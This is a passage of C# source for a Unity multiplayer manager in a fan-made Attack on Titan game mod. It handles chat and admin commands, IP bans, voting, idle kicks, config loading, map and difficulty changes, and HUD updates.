using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;
using System.Runtime.InteropServices;
using UnityEngine;

public class FengMultiplayerScript : MonoBehaviour
{
    private string vern = "1.6.2";
    private float calllaterDuration;
    private ArrayList chatContent;
    public int connectionPort = 0x6784;
    private ConnectionTesterStatus connectionTestResult = ConnectionTesterStatus.Undetermined;
    public string connectToIP = "127.0.0.1";
    public int difficulty;
    private bool doneTesting;
    public bool enterLobby;
    private float gameEndCD;
    private float gameEndTotalCDtime = 9f;
    private int highestwave;
    private int humanScore;
    private bool isCallLaterNetworkConnectMyLastHostData;
    private bool isCallLaterNetworkInitializeServer;
    private bool isCallLaterRPCLoadLevel;
    public bool isFirstMatch = true;
    private bool isLosing;
    public bool isMultiplayer;
    private bool isPlayer1Winning;
    private bool isPlayer2Winning;
    private bool isWinning;
    private int lastLevelPrefix;
    public string map;
    public string myLastHero;
    public string myLastHeroName;
    public HostData myLastHostData;
    public string myNetworkplayerIDOnServer;
    public int myNetworkplayerIndexOnServer;
    public float myRespawnTime;
    public GameObject mySpawnHeroObject;
    public int numberOfPlayers = 3;
    public string playerName;
    public PlayerInfo[] players;
    public PlayerInfo[] playersRegistered;
    public bool[] waittospawn;
    private bool probingPublicIP;
    public string serverName;
    public string serverNameForClient;
    private int serverPort = 0x270f;
    private string shouldEnableNatMessage = string.Empty;
    private string testMessage = "Test in progress";
    private string testStatus = "Testing network connection capabilities.";
    public int time;
    private float timeElapse;
    private float timer;
    private float timeTotal;
    private float timeTotalServer;
    private int titanScore;
    public bool useNAT;
    private bool useNatA;
    public bool usingMasterServer = true;
    private int wave = 1;
    public static bool isReelKeyChanged = false;
    public static string reelinkey;
    public static string reelinkey2;
    public static string reeloutkey;
    public static bool isNotShowDamage = false;
    public static bool isLobbySettingsOverriden = false;
    public static bool isTitanRegenEnabled = false;
    public static bool isBigTotons = false;
    public static bool isTitanHpEnabled = false;
    public static bool isAnniecalypse = false;
    public static bool isAnnieasymodo = false;
    public static bool iscrawler = false;
    public bool viewmod = false;
    public int privates = 0;
    public bool isTPSfixEnabled = false;
    public bool lobbyover = false;
    public bool lobbypass = false;
    public bool REMOVELOBBY = false;
    public bool letpublic = false;
    public bool isPublicGame = false;
    public bool isOverrideTime = false;
    public bool isDedicated = false;
    public bool isNetworkLogged = false;
    public bool islava = false;
    public bool noname = false;
    public bool showhp = false;
    public string password = "qsd123";
    public int nump;
    public string motd;
    public string servernameo;
    public bool camerao = false;
    public bool isTotonbusterEnforced = false;
    public bool isNightmodeEnforced = false;
    public bool nohook = false;
    public String currentVote;
    public int voteYes;
    public int startVoteTime;
    public static int VoteTime = 30;
    public static Boolean Vote = true;
    Vector3[] pos;
    List<BanInfo> Banlist = new List<BanInfo>();
     #if DEBUG
        public bool lawn = false;
        public bool dick = false;
        public bool gold = false;
     #endif
     SaveData data = new SaveData()
        {
        kills =0,
        deaths = 0,
        playtime = 0f,
        };
    public void change(string name)
    {
        if(name == "Annie")
             isAnniecalypse = !isAnniecalypse;
        if (name == "Big")
        {
            isBigTotons = !isBigTotons;
        }
        if (name == "Crawler")
            iscrawler = !iscrawler;
        if(name == "idle")
        {
        #if Server
            startidle();
        #endif
        }
        if (name == "hook")
            this.nohook = !this.nohook;

    }
    #if Server
    public void startidle()
    {
        CancelInvoke();
        InvokeRepeating("cleanupidle", 35f, 30f);
    }
    #endif
    public void handlecmd(String cmd, String[] args)
    {
        if (cmd == "say")
        {
            string put = "";
            for (int i = 1; i < args.Length; i++)
                put += args[i] + " ";
            this.sendChatContent(put);
        }
        else if (cmd == "server")
        {
            string put = "";
            for (int i = 1; i < args.Length; i++)
            {
                put += args[i] + " ";
            }
            serverName = put;
            MasterServer.RegisterHost("AOTTG", "[" + map + "]" + serverName, string.Empty);
        }
        else if (cmd == "blist")
        {
            foreach (BanInfo ban in Banlist)
            {
                DebugConsole.Log(ban.ipaddrese + ": " + ban.reason + " For:" + (ban.hours / 36000000000).ToString() + " hours");
            }
        }
        else if(cmd == "export")
        {
            //EXPORT BANLIST qsd1
            FileStream fss = new FileStream("BanExport.dat", FileMode.Create);
            BinaryFormatter formatter = new BinaryFormatter();
            try
            {
                formatter.Serialize(fss, Banlist);
            }
            catch (SerializationException e)
            {
                DebugConsole.Log("Failed to serialize. Reason: " + e.Message);
                throw;
            }
            finally
            {
                fss.Close();
            }
        }
#if Server
        else if(cmd == "ban")
        {
            string reas = "";
            if (args[3] == null)
            {
                args[3] = "No Reason";
            }
            for (int k = 3; k < args.Length; k++)
            {
                reas = reas + " " + args[k];
            }
            reas = reas + " By " + myLastHeroName;
            banplayer(Convert.ToInt32(args[1]), Convert.ToInt32(args[2]), reas);
        }
        else if(cmd == "bana")
        {
            string reas = "";
            if (args[3] == null)
            {
                args[3] = "No Reason";
            }
            for (int k = 3; k < args.Length; k++)
            {
                reas = reas + " " + args[k];
            }
            reas = reas + " By " + myLastHeroName;
            Banlist.Add(new BanInfo
            {
                ipaddrese = args[1],
                hours = (long) Convert.ToInt64(args[2]) * 36000000000,
                reason = reas,
                issued = System.DateTime.Now.Ticks,
            });
            saveban();
        }
        else if(cmd == "banr")
        {
            if (Banlist.Exists(x => x.ipaddrese == args[1]))
            {
                Banlist.Remove(Banlist.Find(x => x.ipaddrese == args[1]));
                saveban();
            }
        }
#endif
#if DEBUG
        else if (cmd == "lm")
        {
            this.lawn = !this.lawn;
            return;
        }
        else if (cmd == "gold")
        {
            this.dick = !this.dick;
            return;
        }
        else if (cmd == "dick")
        {
            this.gold = !this.gold;
            return;
        }
        else if (cmd == "respawn")
            this.SpawnPlayer(myLastHero, "playerRespawn");
        else if (cmd == "restock")
            mySpawnHeroObject.GetComponent<HERO>().getSupply();
    #endif
    }
#if Server
    public void banplayer(int playernumber , int length,string rea)
    {
        int index = 0;
        while ((index < (this.players.Length - 1)))
        {
            if (this.players[index] != null)
            {
                if ((Convert.ToInt32(this.players[index].id) == playernumber))
                    break;
            }
            index++;
        }
        if (index < (this.players.Length - 1))
        {
            Banlist.Add(new BanInfo
            {
                ipaddrese = this.players[index].networkplayer.ipAddress,
                hours = (long) length * 36000000000,
                reason = rea,
                issued = System.DateTime.Now.Ticks,
            });
            Network.RemoveRPCs(this.players[index].networkplayer);
            Network.DestroyPlayerObjects(this.players[index].networkplayer);
            Network.CloseConnection(this.players[index].networkplayer, true);
            this.players[index] = null;
            this.playerWhoTheFuckIsDead("-1");
            saveban();
        }
    }
#endif
    [RPC]
    public void infod(NetworkPlayer orig,String Vern)
    {
        base.networkView.RPC("showChatContent", orig, Vern);
    }
    [RPC]
    public void info(bool all,NetworkMessageInfo info)
    {
        string text;
        #if DEBUG
        text = "[e39629]*I am Running Version:" + vern + " Bope*[-]\n";
        #else 
        #if Server
        text = "[e39629]*I am Running Version:" + vern + " Mira*[-]\n";
        #else
        text = "[e39629]*I am Running Version:" + vern + " Client*[-]\n";
        #endif
        #endif
        base.networkView.RPC("showChatContent", info.sender, text);
        if(all)
        GameObject.Find("MultiplayerManager").networkView.RPC("inf", RPCMode.Others, info.sender);
    }
    [RPC]
    public void inf(NetworkPlayer orig)
    {
        string text;
        #if DEBUG
        text = "[e39629]*" + this.myNetworkplayerIndexOnServer + " am Running Version:" + vern + " Bope*[-]\n";
        #else
        #if Server
        text = "[e39629]*" + this.myNetworkplayerIndexOnServer + " am Running Version:" + vern + " Mira*[-]\n";
        #else
        text = "[e39629]*" + this.myNetworkplayerIndexOnServer + " am Running Version:" + vern + " Client*[-]\n";
        #endif
        #endif
        object[] args = new object[] { orig, text };
        base.networkView.RPC("infod", RPCMode.Server, args);
    }
    [RPC]
    public void rconcmd(String cmd,String By, NetworkMessageInfo info)
    {
        #if Server
        Debug.Log("Got "+ cmd +" From: " + By + " Slot: "+ info.sender.ToString() + " IP: " + info.sender.ipAddress);
        DebugConsole.Log("Got " + cmd + " From: " + By + " Slot: " + info.sender.ToString() + " IP: " + info.sender.ipAddress);
        for (int i = 0; i < this.numberOfPlayers; i++)
        {
            if ((this.players[i] != null) && (info.sender.ToString() == this.players[i].id))
            {
                if(!this.players[i].mod)
                {
                    if((this.players[i]==null) || !(info.sender.ToString() == this.players[i].id))
                    {
                        continue;

                    }

                   if (cmd.StartsWith("voteyes") && Vote && !this.players[i].mod)
                   {
                       if(currentVote == null)
                       {
                           base.networkView.RPC("showChatContent", info.sender, new object[] { "[e39629]*There is no current vote running.*[-]\n" });
                       }
                       else
                       {
                           voteYes++;
                           int playersExist = 0;
                           if (isDedicated)
                           {
                               playersExist = -1;
                           }
                           foreach(PlayerInfo ply in this.players)
                           {
                               if(ply != null)
                               {
                                   playersExist++;
                               }
                           }
                           base.networkView.RPC("showChatContent", RPCMode.All, new object[] { "[e39629]*" + voteYes.ToString() + "\\" + playersExist.ToString() + " voted for: " + currentVote + ".*[-]\n" });
                           if (voteYes >= (((float)playersExist) / 2.0))
                           {
                               this.rconcmd(currentVote, By, new NetworkMessageInfo());
                               voteYes = 0;
                               currentVote = null;
                           }
                       }
                   }
                   else if (cmd.StartsWith("vote") && Vote && !this.players[i].mod)
                   {
                       if (currentVote != null)
                       {
                           base.networkView.RPC("showChatContent", info.sender, new object[] { "[e39629]*There is already a vote running, wait until it is done.*[-]\n" });
                       }
                       else
                       {
                           currentVote = cmd.Substring(5).Trim().ToLower();
                           voteYes = 1;
                           startVoteTime = (int)Time.time + VoteTime;
                           base.networkView.RPC("showChatContent", RPCMode.All, new object[] { "[e39629]*Vote: " + currentVote + "started, please enter / voteyes when you want this to happen.*[-]\n" });
                           int playersExist = 0;
                           if(isDedicated)
                           {
                               playersExist = -1;
                           }
                           foreach(PlayerInfo ply in this.players)
                           {
                               if(ply != null)
                               {
                                   playersExist++;
                               }
                           }
                           base.networkView.RPC("showChatContent", RPCMode.All, new object[] { "[e39629]*" + voteYes.ToString() + "\\" + playersExist.ToString() + " voted for: " + currentVote + ".*[-]\n" });
                           if (voteYes >= (((float)playersExist) / 2.0))
                           {
                               this.rconcmd(currentVote, By, new NetworkMessageInfo());
                               voteYes = 0;
                               currentVote = null;
                           }
                       }
                   }

                }
                if (this.players[i].rcon && this.players[i].mod)
                {
                    if (cmd.StartsWith("kick"))
                    {
                        int playernumber = Convert.ToInt32(cmd.Substring(4));
                        kickPlayer(playernumber);
                    }
                    else if (cmd.StartsWith("ban"))
                    {
                        string[] args = cmd.Split();
                        string reas = "";
                        if (args[3] == null)
                        {
                            args[3] = "No Reason";
                        }
                        for (int k = 3; k < args.Length; k++)
                        {
                            reas = reas + " " + args[k];
                        }
                        reas = reas + " By " + By;
                        banplayer(Convert.ToInt32(args[1]), Convert.ToInt32(args[2]), reas);
                    }
                    else if (cmd == "restart")
                    {
                        restartGame();
                    }
                    else if (cmd ==  ("lava"))
                    {
                        this.islava = !this.islava;
                        base.networkView.RPC("showChatContent", info.sender, "[e39629]*Toggled Lava Mode*[-]\n");
                    }
                    else if (cmd == ("showhp"))
                    {
                        this.showhp = !this.showhp;
                        base.networkView.RPC("showChatContent", info.sender, "[e39629]*Now showing HP*[-]\n");
                    }
                    else if (cmd == ("crawler"))
                    {
                        this.change("Crawler");
                        base.networkView.RPC("showChatContent", info.sender, "[e39629]*Toggled Crawler Mode*[-]\n");
                    }
                    else if (cmd == ("big"))
                    {
                        this.change("Big");
                        base.networkView.RPC("showChatContent", info.sender, "[e39629]*Toggled Bigtoon Mode*[-]\n");
                    }
                    else if (cmd == ("annie"))
                    {
                        this.change("Annie");
                        base.networkView.RPC("showChatContent", info.sender, "[e39629]*Toggled Annie Mode*[-]\n");
                    }
                    else if (cmd.StartsWith("map"))
                    {
                        string str2 = cmd.Substring(4).Trim().ToLower();
                        string map = null;
                        switch (str2)
                        {
                            case "the city i":
                            case "city":
                            case "city 1":
                            case "the city 1":
                                map = "The City I";
                                break;

                            case "the city ii":
                            case "the city 2":
                            case "city 2":
                            case "city ii":
                                map = "The City II";
                                break;

                            case "cage fighting":
                                map = "Cage Fighting";
                                break;

                            case "the forest":
                            case "forest":
                            case "forest 1":
                            case "the forest 1":
                            case "the forest i":
                                map = "The Forest";
                                break;

                            case "the forest ii":
                            case "the forest 2":
                            case "forest 2":
                            case "forest ii":
                                map = "The Forest II";
                                break;

                            case "the forest iii":
                            case "the forest 3":
                            case "forest 3":
                            case "forest iii":
                                map = "The Forest III";
                                break;

                            case "annie":
                            case "annie 1":
                            case "annie i":
                                map = "Annie";
                                break;

                            case "annie ii":
                            case "annie 2":
                                map = "Annie II";
                                break;
                            case "colossal titan":
                            case "colossal titan 1":
                            case "colossal titan i":
                                map = "Colossal Titan";
                                break;
                            case "colossal titan 2":
                            case "colossal titan ii":
                                map = "Colossal Titan II";
                                break;
                            case "trost":
                            case "trost 1":
                            case "trost i":
                                map = "Trost";
                                break;
                            case "trost 2":
                            case "trosti i":
                                map = "Trost II";
                                break;
                        }
                        if (map != null)
                        {
                            this.changeMap(map);
                            base.networkView.RPC("showChatContent", info.sender, "[e39629]*Map changed. Please \"/rcon restart\" the game.*[-]\n");
                        }
                        else
                        {
                            base.networkView.RPC("showChatContent", info.sender, "[e39629]Unknown map name.\nMap names are : \nThe City I\nThe City II\nCage Fighting\nThe Forest\nThe Forest II\nThe Forest III\nAnnie\nAnnie II\nColossal Titan\nColossal Titan II[-]\n");
                        }
                    }
                    else if (cmd.StartsWith("difficulty"))
                    {
                        string str = cmd.Substring(11).Trim().ToLower();
                        int difficulty = -2;
                        string str4 = str;
                        if (str4 != null)
                        {
                            if (!(str4 == "training"))
                            {
                                if (str4 == "normal")
                                {
                                    difficulty = 0;
                                }
                                else if (str4 == "hard")
                                {
                                    difficulty = 1;
                                }
                                else if (str4 == "abnormal")
                                {
                                    difficulty = 2;
                                }
                            }
                            else
                            {
                                difficulty = -1;
                            }
                        }
                        if (difficulty != -2)
                        {
                            this.setDifficulty(difficulty);
                        }
                        else
                        {
                            base.networkView.RPC("showChatContent", info.sender, "[e39629]Unknown difficulty. Difficulies are :\nTraining\nNormal\nHard\nAbnormal[-]\n");
                        }
                    }

                }
                if (cmd.StartsWith("login") && cmd.Substring(6) == this.password)
                {
                    this.players[i].rcon = true;
                    base.networkView.RPC("showChatContent", info.sender, "[e39629]*You have Logged in*[-]\n");
                }

            }
        }
        #endif
    }
    #if Server
    public void cleanupidle() 
    {
            for (int i = 1; i < this.numberOfPlayers; i++)
            {
                if(this.players[i] != null)
                {
                    if (!this.players[i].dead & this.players[i].rcon==false)
                    {
                        if (this.players[i].play.transform.position.ToString("G5") == pos[i].ToString("G5") && !(this.players[i].play.networkView.isMine))
                        {
                            DebugConsole.Log("kick " + this.players[i].play.networkView.owner.ToString());
                            Network.RemoveRPCs(this.players[i].networkplayer);
                            Network.DestroyPlayerObjects(this.players[i].networkplayer);
                            Network.CloseConnection(this.players[i].networkplayer, true);
                            this.playerWhoTheFuckIsDead("-1");
                        }
                        pos[i] = this.players[i].play.transform.position;
                    }
                    if(Network.GetLastPing(players[i].networkplayer) == -1 && i != 0)
                    {
                           Network.RemoveRPCs(this.players[i].networkplayer);
                           Network.DestroyPlayerObjects(this.players[i].networkplayer);
                           Network.CloseConnection(this.players[i].networkplayer, true);
                           players[i] = null;
                           this.playerWhoTheFuckIsDead("-1");
                    }
                }
            }

     }
    #endif
    public void loadConfigFiles()
    {
        string[] strArray;
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        foreach (string str in File.ReadAllLines("AyaMod_Player.cfg"))
        {
            strArray = str.Split(new char[] { '=' });
            dictionary.Add(strArray[0], strArray[1]);
        }
        this.myLastHeroName = dictionary["Name"];
        string namez = this.myLastHeroName; 
        while (namez.LastIndexOf("[") > 0)
        {
            namez = namez.Remove(namez.LastIndexOf("[-"), 3);
            namez = namez.Remove(namez.LastIndexOf("["), 8);
        }
        if (namez.Length > 15)
        {
            string[] choice = new string[] { "tigglebits", "skippydippy","guacamole","yoshi","froglegstew","zippity","calatalee","figaro","bugweiser","constipation"};
            this.myLastHeroName = choice[UnityEngine.Random.Range(0,9)];
        }
        this.myLastHero = dictionary["Character"].ToUpper();
        if (dictionary.ContainsKey("TPSfix"))
        {
            this.isTPSfixEnabled = dictionary["TPSfix"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("ReelInKey"))
        {
            isReelKeyChanged = true;
            reelinkey = dictionary["ReelInKey"];
            reelinkey2 = dictionary["ReelInKey"];
        }
        if (dictionary.ContainsKey("ReelInKey2"))
        {
            isReelKeyChanged = true;
            reelinkey2 = dictionary["ReelInKey2"];
        }
        if (dictionary.ContainsKey("ReelOutKey"))
        {
            isReelKeyChanged = true;
            reeloutkey = dictionary["ReelOutKey"];
        }
        if (dictionary.ContainsKey("Dontshowdamage"))
        {
            isNotShowDamage = dictionary["Dontshowdamage"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("usetps"))
        {
           this.camerao = dictionary["usetps"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("nosound"))
        {
           AudioListener.pause = dictionary["nosound"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("OverrideLobbySettings"))
        {
            isLobbySettingsOverriden = dictionary["OverrideLobbySettings"].ToLower().Equals("true");
            this.lobbyover = dictionary["OverrideLobbySettings"].ToLower().Equals("true");
        }
        if (this.myLastHero == "TITAN_EREN")
        {
            this.myLastHero = "MARCO";
        }
        #if Server
        dictionary = new Dictionary<string, string>();
        foreach (string str in File.ReadAllLines("AyaMod_Server.cfg"))
        {
            strArray = str.Split(new char[] { '=' });
            dictionary.Add(strArray[0], strArray[1]);
        }
        if(dictionary.ContainsKey("VOTETime"))
        {
            VoteTime = Convert.ToInt32(dictionary["VOTETime"]);
        }
        if (dictionary.ContainsKey("TitanHP"))
        {
            isTitanHpEnabled = dictionary["TitanHP"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("Night"))
            this.isNightmodeEnforced = dictionary["Night"].ToLower().Equals("true");
        if (dictionary.ContainsKey("TotonBuster"))
            this.isTotonbusterEnforced = dictionary["TotonBuster"].ToLower().Equals("true");
        if (dictionary.ContainsKey("MOTD"))
        {
            this.motd= dictionary["MOTD"];
        }
        if (dictionary.ContainsKey("Crawler"))
        {
            iscrawler = dictionary["Crawler"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("ServerName"))
        {
            this.servernameo = dictionary["ServerName"];
        }
        if (dictionary.ContainsKey("letpublic"))
        {
            this.letpublic = dictionary["letpublic"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("private"))
        {
            this.privates = Convert.ToInt32(dictionary["private"]);
        }
        if (dictionary.ContainsKey("TitanRegen"))
        {
            isTitanRegenEnabled = dictionary["TitanRegen"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("REMOVELOBBYREMOVELOBBY"))
        {
            this.REMOVELOBBY = dictionary["REMOVELOBBYREMOVELOBBY"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("PublicGame"))
        {
            this.isPublicGame = dictionary["PublicGame"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("BIGTOTON"))
        {
            isBigTotons = dictionary["BIGTOTON"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("TIME"))
        {
            this.time = Convert.ToInt32(dictionary["TIME"]) * 60;
            this.isOverrideTime = true;
        }
        if (dictionary.ContainsKey("DEDICATED"))
        {
            this.isDedicated = dictionary["DEDICATED"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("LogNetwork"))
        {
            this.isNetworkLogged = dictionary["LogNetwork"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("Anniecalypse"))
        {
            isAnniecalypse = dictionary["Anniecalypse"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("Annieasymodo"))
        {
            isAnnieasymodo = dictionary["Annieasymodo"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("Lava"))
        {
            this.islava = dictionary["Lava"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("showhp"))
        {
            this.showhp= dictionary["showhp"].ToLower().Equals("true");
        }
        if (dictionary.ContainsKey("Rcon"))
        {
            this.password = dictionary["Rcon"];
        }
        #endif
        if (this.isTPSfixEnabled)
        {
            IN_GAME_MAIN_CAMERA.setTPSfixOn();
        }
    }
    public bool checkIfHasEren()
    {
        if (LevelInfo.getInfo(this.map).type == GAMEMODE.TROST)
        {
            return true;
        }
        for (int i = 0; i < this.numberOfPlayers; i++)
        {
            if ((this.playersRegistered[i] != null) && (this.playersRegistered[i].resourceId == "EREN"))
            {
                return true;
            }
        }
        return false;
    }

    private bool checkIsTitanAllDie()
    {
        foreach (GameObject obj2 in GameObject.FindGameObjectsWithTag("titan"))
        {
            if ((obj2.GetComponent<TITAN>() != null) && !obj2.GetComponent<TITAN>().hasDie)
            {
                return false;
            }
            if (!isAnniecalypse)
            {
                if (obj2.GetComponent<FEMALE_TITAN>() != null)
                {
                    return false;
                }
            }
            else if (!((obj2.GetComponent<FEMALE_TITAN>() == null) || obj2.GetComponent<FEMALE_TITAN>().hasDie))
            {
                return false;
            }
        }
        return true;
    }

    public void CTgetHurt(NetworkViewID killer, int Damage, string name)
    {
        object[] args = new object[] { Damage };
        base.networkView.RPC("netShowDamage", killer.owner, args);
        for (int i = 0; i < this.numberOfPlayers; i++)
        {
            if ((this.players[i] != null) && (killer.owner.ToString() == this.players[i].id))
            {
                this.playerDamageInfoUpdate(this.players[i], Damage);
                this.sendChatContentInfo(string.Concat(new object[] { "[FFFB40]*", this.players[i].name, " just deal ", Damage, " damage to colossal titan!*[-]" }));
                return;
            }
        }
    }

    public void CTgetHurtbyServer(int Damage, string name)
    {
        this.sendChatContentInfo(string.Concat(new object[] { "[FFFB40]*", this.myLastHeroName, " just deal ", Damage, " damage to colossal titan!*[-]" }));
        this.netShowDamage(Damage);
        this.playerDamageInfoUpdate(this.players[0], Damage);
    }

    public void Disconnect()
    {
        Network.Disconnect();
        Screen.lockCursor = false;
        Screen.showCursor = true;
    }

    public void FTankleGetHurt(NetworkViewID killer, int Damage, string name)
    {
        object[] args = new object[] { Damage };
        base.networkView.RPC("netShowDamage", killer.owner, args);
        for (int i = 0; i < this.numberOfPlayers; i++)
        {
            if ((this.players[i] != null) && (killer.owner.ToString() == this.players[i].id))
            {
                this.sendChatContentInfo(string.Concat(new object[] { "[FFFB40]*", this.players[i].name, " just deal ", Damage, " damage to female titan's ankle!*[-]" }));
                return;
            }
        }
    }

    public void FTankleGetHurtbyServer(int Damage, string name)
    {
        this.sendChatContentInfo(string.Concat(new object[] { "[FFFB40]*", this.myLastHeroName, " just deal ", Damage, " damage to female titan's ankle!*[-]" }));
        this.netShowDamage(Damage);
    }

    public void FTgetHurt(NetworkViewID killer, int Damage, string name)
    {
        object[] args = new object[] { Damage };
        base.networkView.RPC("netShowDamage", killer.owner, args);
        for (int i = 0; i < this.numberOfPlayers; i++)
        {
            if ((this.players[i] != null) && (killer.owner.ToString() == this.players[i].id))
            {
                this.playerDamageInfoUpdate(this.players[i], Damage);
                this.sendChatContentInfo(string.Concat(new object[] { "[FFFB40]*", this.players[i].name, " just deal ", Damage, " damage to female titan!*[-]" }));
                return;
            }
        }
    }

    public void FTgetHurtbyServer(int Damage, string name)
    {
        this.sendChatContentInfo(string.Concat(new object[] { "[FFFB40]*", this.myLastHeroName, " just deal ", Damage, " damage to female titan!*[-]" }));
        this.netShowDamage(Damage);
        this.playerDamageInfoUpdate(this.players[0], Damage);
    }

    public void gameLose()
    {
        this.netGameLose();
    }

    public void gameWin()
    {
        if (!this.isLosing && !this.isWinning)
        {
            this.isWinning = true;
            this.humanScore++;
            this.gameEndCD = this.gameEndTotalCDtime;
        }
    }

    [RPC]
    private void LoadLevelII(string level, int levelPrefix)
    {
        Debug.Log("RPC LOAD LEVEL : " + level);
        //DebugConsole.Log("New Level");
        IN_GAME_MAIN_CAMERA.gamemode = LevelInfo.getInfo(level).type;
        this.map = level;
        this.lastLevelPrefix = levelPrefix;
        Network.SetSendingEnabled(0, false);
        Network.isMessageQueueRunning = false;
        Network.SetLevelPrefix(levelPrefix);
        Application.LoadLevel(level);
    }

    [RPC]
    private void netGameLose()
    {
        if (!this.isWinning && !this.isLosing)
        {
            this.isLosing = true;
            this.titanScore++;
            this.gameEndCD = this.gameEndTotalCDtime;
        }
    }
    [RPC]
    public void modme(string Ver, NetworkMessageInfo info)
    {
        if (Ver == this.vern)
        {
            for (int num = 0; num < this.numberOfPlayers; num++)
            {
                if ((this.players[num] != null) && (this.players[num].id == info.sender.ToString()))
                {
                    this.players[num].mod = true;

                }
            }
        }
    }
    [RPC]
    private void netSetPlayerInfo(string name, string id, string resourceID, NetworkMessageInfo info)
    {
        if (name.Contains("["))
        {
            if (name[name.LastIndexOf("[")+2] != ']')
            {
                name = name + "[-]";
            }
        }
        #if Server
        if (!this.lobbypass)
        {
        #endif
            if (!this.enterLobby)
            {
                Debug.Log("I am server AND I am recieve player Info from " + id + " Name: " + name + " IP: " + info.sender.ipAddress);

                for (int num = 0; num < this.numberOfPlayers; num++)
                {
                    if ((this.players[num] != null) && (this.players[num].id == info.sender.ToString()))
                    {
                        if (((resourceID == "EREN") && this.checkIfHasEren()) && (this.playersRegistered[num].resourceId != "EREN"))
                        {
                            resourceID = "MIKASA";
                        }
                        this.playersRegistered[num].name = name;
                        this.playersRegistered[num].SET = true;
                        this.playersRegistered[num].resourceId = resourceID;
                        this.players[num].name = name;
                        this.players[num].SET = true;
                        this.players[num].resourceId = resourceID;
                        if (resourceID == "EREN")
                        {
                            base.networkView.RPC("setMyHeroToEren", this.playersRegistered[num].networkplayer, new object[0]);
                        }
                        this.waittospawn[num] = true;
                    }
                }
                object[] args2 = new object[] { this.map, this.lastLevelPrefix };
                base.networkView.RPC("LoadLevelII", info.sender, args2);
            }
            else{
                Debug.Log("I am server AND I am recieve player Info from " + id + " Name: " + name + " IP: " + info.sender.ipAddress);
                for (int i = 0; i < this.numberOfPlayers; i++)
                {
                    if ((this.playersRegistered[i] != null) && (this.playersRegistered[i].id == id))
                    {
                        this.playersRegistered[i].name = name;
                        this.playersRegistered[i].SET = true;
                        if (((resourceID == "EREN") && this.checkIfHasEren()) && (this.playersRegistered[i].resourceId != "EREN"))
                        {
                            resourceID = "MIKASA";
                        }
                        this.playersRegistered[i].resourceId = resourceID;
                        if (resourceID == "EREN")
                        {
                            base.networkView.RPC("setMyHeroToEren", this.playersRegistered[i].networkplayer, new object[0]);
                        }
                    }
                }
            }
        #if Server
        }
        else
        {
            Debug.Log("I am server AND I am recieve player Info from " + id + " Name: " + name + " IP: " + info.sender.ipAddress);
            for (int num = 0; num < this.numberOfPlayers; num++)
            {
                if ((this.players[num] != null) && (this.players[num].id == info.sender.ToString()))
                {
                    this.players[num].name = name;
                    this.players[num].SET = true;
                    this.players[num].resourceId = resourceID;
                    this.playersRegistered[num].name = name;
                    this.playersRegistered[num].SET = true;
                    this.playersRegistered[num].resourceId = resourceID;
                    this.waittospawn[num] = false;
                }
            }
            object[] args = new object[] { this.map, this.lastLevelPrefix};
        }
        #endif
    }

    [RPC]
    public void netShowDamage(int speed)
    {
        if (!isNotShowDamage)
        {
            GameObject target = GameObject.Find("LabelScore");
            if (target != null)
            {
                target.GetComponent<UILabel>().text = speed.ToString();
                target.transform.localScale = Vector3.zero;
                speed = (int)(speed * 0.1f);
                speed = Mathf.Max(40, speed);
                speed = Mathf.Min(150, speed);
                iTween.Stop(target);
                object[] args = new object[] { "x", speed, "y", speed, "z", speed, "easetype", iTween.EaseType.easeOutElastic, "time", 1f };
                iTween.ScaleTo(target, iTween.Hash(args));
                object[] objArray2 = new object[] { "x", 0, "y", 0, "z", 0, "easetype", iTween.EaseType.easeInBounce, "time", 0.5f, "delay", 2f };
                iTween.ScaleTo(target, iTween.Hash(objArray2));
            }
        }
    }

    [RPC]
    public void netShowHUDInfoCenter(string content)
    {
        GameObject obj2 = GameObject.Find("LabelInfoCenter");
        if (obj2 != null)
        {
            obj2.GetComponent<UILabel>().text = content;
        }
    }

    [RPC]
    public void netShowHUDInfoTopCenter(string content)
    {
        GameObject obj2 = GameObject.Find("LabelInfoTopCenter");
        if (obj2 != null)
        {
                if (this.noname)
                    content = " ";
                obj2.GetComponent<UILabel>().text = content;
        }
    }

    [RPC]
    private void netShowHUDInfoTopLeft(string content)
    {
        GameObject obj2 = GameObject.Find("LabelInfoTopLeft");
        if (obj2 != null)
        {
                content = content.Replace("[" + this.myNetworkplayerIDOnServer + "]", "[*^_^*]");
                if (this.noname)
                    content = " ";
                obj2.GetComponent<UILabel>().text = content;
        }
    }

    [RPC]
    private void netShowHUDInfoTopRight(string content)
    {
        GameObject obj2 = GameObject.Find("LabelInfoTopRight");
        if (obj2 != null)
        {
                if (this.noname)
                    content = " ";
                obj2.GetComponent<UILabel>().text = content;
        }
    }

    [RPC]
    private void netShowHUDInfoTopRightMAPNAME(string content)
    {
        GameObject obj2 = GameObject.Find("LabelInfoTopRight");
        if (obj2 != null)
        {

            if (this.noname)
                content = " ";
            UILabel component = obj2.GetComponent<UILabel>();
            component.text = component.text + content;
        }
    }

    private void OnCameraDefaultActivate(bool isChecked)
    {
        if (isChecked)
        {
            IN_GAME_MAIN_CAMERA.cameraMode = CAMERA_TYPE.ORIGINAL;
        }
    }

    private void OnCameraTPSActivate(bool isChecked)
    {
        if (isChecked)
        {
            IN_GAME_MAIN_CAMERA.cameraMode = CAMERA_TYPE.TPS;
        }
    }

    private void OnCameraWOWActivate(bool isChecked)
    {
        if (isChecked)
        {
            IN_GAME_MAIN_CAMERA.cameraMode = CAMERA_TYPE.WOW;
        }
    }
    public void changeMap(string map)
    {
        this.map = map;
    }
    private void onCharacterChange(string name)
    {
        this.myLastHero = name;
    }

